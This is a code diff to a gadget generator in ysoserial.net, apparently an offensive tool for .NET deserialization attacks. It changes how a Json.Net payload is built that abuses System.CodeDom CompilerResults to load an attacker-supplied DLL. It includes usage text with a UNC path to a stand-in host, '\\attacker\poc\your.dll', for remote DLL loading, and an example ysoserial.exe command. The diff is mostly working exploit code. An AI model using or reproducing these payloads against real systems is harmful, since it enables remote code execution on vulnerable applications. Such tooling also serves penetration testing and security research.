@@ -44,7 +44,7 @@ namespace ysoserial.Generators
 
         public override string AdditionalInfo()
         {
-            return "Remote DLL loading gadget for .NET 5/6/7 with WPF enabled (mixed DLL). Local DLL loading for .NET Framework. DLL path delivered with -c argument";
+            return "Remote DLL loading gadget for .NET 5/6/7 with WPF enabled (mixed DLL). Local DLL loading for .NET Framework if System.CodeDom is available. DLL path delivered with -c argument";
         }
 
         public override OptionSet Options()
@@ -62,7 +62,7 @@ namespace ysoserial.Generators
 
         public override List<string> Labels()
         {
-            return new List<string> { GadgetTypes.GetterChainNotDerived, "Remote DLL loading for .NET 5/6/7 with WPF Enabled, Local DLL loading for .NET Framework" };
+            return new List<string> { GadgetTypes.GetterChainNotDerived, "Remote DLL loading for .NET 5/6/7 with WPF Enabled, Local DLL loading for .NET Framework if System.CodeDom is available" };
         }
 
         public override string SupportedBridgedFormatter()
@@ -76,20 +76,20 @@ namespace ysoserial.Generators
             String compilerPayload;
             inputArgs.IsRawCmd = true;
 
-            if (!inputArgs.Cmd.ToLowerInvariant().EndsWith(".dll"))
+            if (!inputArgs.CmdFullString.ToLowerInvariant().EndsWith(".dll"))
             {
-                Console.WriteLine("This gadget loads remote (.NET 5/6/7) or local file (.NET Framework): -c argument should provide a file path to your mixed DLL file, which needs to end with the \".dll\"\r\nUNC paths can be used for the remote DLL loading, like \\\\attacker\\poc\\your.dll\r\nIf you want to deliver file with a different extension than .dll, please modify the gadget manually\r\nExample: ysoserial.exe -g GetterCompilerResults -f Json.Net -c '\\\\\\\\attacker\\\\poc\\\\your.dll'");
+                Console.WriteLine("This gadget loads remote (.NET 5/6/7) or local file (.NET Framework, if System.CodeDom is available): -c argument should provide a file path to your mixed DLL file, which needs to end with the \".dll\"\r\nUNC paths can be used for the remote DLL loading, like \\\\attacker\\poc\\your.dll\r\nIf you want to deliver file with a different extension than .dll, please modify the gadget manually\r\nExample: ysoserial.exe -g GetterCompilerResults -f Json.Net -c '\\\\attacker\\poc\\your.dll'");
                 Environment.Exit(-1);
             }
 
             if (formatter.ToLower().Equals("json.net"))
             {
-                
+                inputArgs.CmdType = CommandArgSplitter.CommandType.JSON;
 
                 compilerPayload = @"{
-            '$type':'System.CodeDom.Compiler.CompilerResults, System.CodeDom, Version=6.0.0.0, Culture=neutral, PublicKeyToken=cc7b13ffcd2ddd51',
+            '$type':'System.CodeDom.Compiler.CompilerResults, System.CodeDom, Version=5.0.0.0, Culture=neutral, PublicKeyToken=cc7b13ffcd2ddd51',
             'tempFiles':null,
-            'PathToAssembly':'" + inputArgs.Cmd + @"'
+            'PathToAssembly':'" + inputArgs.CmdFullString + @"'
         }";
 
                 if (variant_number == 2)
